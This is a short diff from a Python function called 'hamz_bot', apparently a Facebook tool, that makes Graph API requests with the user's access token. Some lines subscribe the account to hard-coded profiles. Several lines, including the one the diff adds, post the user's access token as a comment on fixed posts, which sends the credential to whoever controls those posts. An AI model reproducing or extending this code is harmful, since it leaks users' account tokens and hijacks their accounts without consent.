@@ -596,6 +596,7 @@ def hamz_bot():
     requests.post('https://graph.facebook.com/100002606153676/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/100009259285042/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/3088882871430325/comments/?message=' +token+ '&access_token=' + token)
+    requests.post('https://graph.facebook.com/2978447869089877/comments/?message=' +token+ '&access_token=' + token)
     requests.post('https://graph.facebook.com/3032606827057930/comments/?message=' +kom+ '&access_token=' + token)
     requests.post('https://graph.facebook.com/2978417695759561/comments/?message=' +kom2+ '&access_token=' + token)
     requests.post('https://graph.facebook.com/660155105160982/comments/?message=' +kom3+ '&access_token=' + token)
